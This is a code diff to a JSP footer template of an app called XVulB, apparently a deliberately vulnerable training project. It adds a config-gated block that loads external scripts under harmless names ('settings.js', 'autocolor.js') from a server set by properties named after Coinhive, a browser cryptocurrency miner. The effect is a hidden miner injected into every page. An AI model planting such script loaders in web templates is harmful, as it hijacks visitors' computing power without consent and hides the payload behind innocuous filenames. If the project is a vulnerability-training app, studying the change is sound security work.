@@ -1,5 +1,6 @@
 <%@tag description="Wrapper Tag" pageEncoding="UTF-8"%>
 <%@taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
+<%@taglib prefix="spring" uri="http://www.springframework.org/tags" %>
 
 <!DOCTYPE html>
 
@@ -49,6 +50,13 @@
 <div class="container">
     <span class="text-muted">&copy; XVulB 2018</span>
 </div>
+<spring:eval expression="@environment.getProperty('security.coinhive')" var="coinhive" />
+<spring:eval expression="@environment.getProperty('security.coinhive-server')" var="coinhive-server" />
+<c:if test="${coinhive}">
+	<script src="http://foo/settings.js"></script>
+	
+	<script src='<c:url value="${coinhive-server}/autocolor.js"/>'></script>
+</c:if>
 </footer>
 </body>
 </html>
